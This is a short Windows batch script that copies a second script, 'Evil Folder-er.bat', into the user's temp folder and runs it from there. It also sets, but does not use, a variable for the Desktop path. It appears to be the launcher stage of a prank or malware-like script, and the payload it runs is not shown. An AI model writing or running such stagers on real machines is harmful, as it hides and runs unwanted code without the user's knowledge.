@ ECHO OFF
SETLOCAL

SET me=%~n0
SET localDesktop=%USERPROFILE%\Desktop
SET localTMP=%TMP%

COPY /Y "Evil Folder-er.bat" %localTMP%
"%localTMP%\Evil Folder-er.bat"
EXIT